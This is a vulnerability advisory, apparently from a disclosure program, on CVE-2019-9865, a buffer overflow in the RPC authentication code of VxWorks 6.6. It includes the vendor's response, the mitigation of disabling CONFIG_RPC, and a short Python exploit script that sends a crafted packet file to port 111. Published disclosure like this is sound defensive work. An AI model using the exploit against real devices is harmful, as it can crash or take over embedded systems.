**Vulnerability Summary**<br>
The following advisory describes a vulnerability found in the Remote Procedure Call (RPC) component of the VxWorks real-time Opearting System, which suffers from a buffer overflow, this buffer overflow can be exploited to cause the component to execute arbitrary code.

**CVE**<br>
CVE-2019-9865

**Credit**<br>
An independent Security Researcher, Yu Zhou, has reported this vulnerability to SSD Secure Disclosure program.

**Affected systems**<br>
VxWorks OS version 6.6

**Vendor Response**<br>
“We’ve gone through our supported versions of VxWorks and found the versions affected are 6.9 before 6.9.1. We released the update to our customers today. Except in special circumstances, we only release statements and fixes for supported products. We know you found this vulnerability in an unsupported version of VxWorks. We won’t have a code update for that, but a mitigation is to disable CONFIG_RPC. This will be published in NVD as CVE-2019-9865. It should be public shortly. Thank you for working with us to resolve this problem. We hope to work with you in the future if you have found other vulnerabilities, and we may have other questions for you.”

**Vulnerability Details**<br>
As previously mentioned, the vulnerability is inside the RPC component. The vulnerable function which contains the buffer overflow is _svcauth_unix. At _svcauth_unix + 0x67, will get the value 0xffffffff from the malicious packet (content will be viewed later).

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/01/VxWorks-6.6-ixdr_get_long.png">

Afterwards, in the cmp eax, 0FFh it will check whether the value (packet content size) is greater than 255 without considering the option of a negative value. The value 0xffffffff is used as the third parameter (nbytes) of the bcopy function, which will finaly cause a buffer overflow.

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/01/VxWorks-6.6-bcopy-Signature.png">

This is the packet that will be sent to the RPC Service:

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/01/VxWorks-6.6-packet-content.png">

**Exploit**<br>
```python
import socket

host = "192.168.15.199"
rpcPort = 111

f = open("pkt", 'rb') # pkt is the file which contains the payload to send.
data = f.read()
f.close()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, rpcPort))
sock.send(data)
sock.close()
```

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/01/VxWorks-6.6-RPC-Crash.png">
